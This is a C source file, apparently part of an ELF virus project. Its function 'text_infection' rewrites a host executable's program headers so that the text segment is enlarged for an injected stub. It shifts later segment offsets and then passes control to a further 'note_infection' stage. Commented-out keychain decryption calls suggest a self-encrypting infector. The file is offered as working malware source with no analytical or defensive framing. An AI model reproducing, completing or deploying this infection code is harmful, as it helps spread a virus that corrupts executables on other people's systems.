#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline Elf64_Phdr *get_segment(const struct s_host *host, const size_t index)
{
	Elf64_Phdr *segment;

	segment = (Elf64_Phdr *)((void *)host->header + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));

	if ((void *)segment >= (void *)host->header + host->filesize)
		segment = NULL;

	return segment;
}

__attribute__((always_inline)) static inline bool is_text_segment(const Elf64_Phdr *segment)
{
	return segment->p_flags == (PF_R | PF_X);
}

__attribute__((always_inline)) static inline void update_text_segment(Elf64_Phdr *segment)
{
	segment->p_filesz += STUB_SIZE;
	segment->p_memsz += STUB_SIZE;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);

#if DEBUG
	MID_TRACER("text_infection:\t\t");
#endif

	if (context == FAILURE)
		goto label;

	Elf64_Phdr *segment = NULL;

	for (register Elf64_Half index = 0; index < host->header->e_phnum; index++)
	{
		if ((segment = get_segment(host, index)) == NULL)
		{
			context = FAILURE;
			goto label;
		}

		if (host->segment[TEXT] != NULL)
			segment->p_offset += PAGE_SIZE;
		if (is_text_segment(segment) == true)
			host->segment[TEXT] = segment;
	}

	if (segment == NULL)
	{
		context = FAILURE;
		goto label;
	}

	update_text_segment(host->segment[TEXT]);


label:
//	update_keychain_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
//	decrypt_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

	note_infection(host, keychain, context);
}
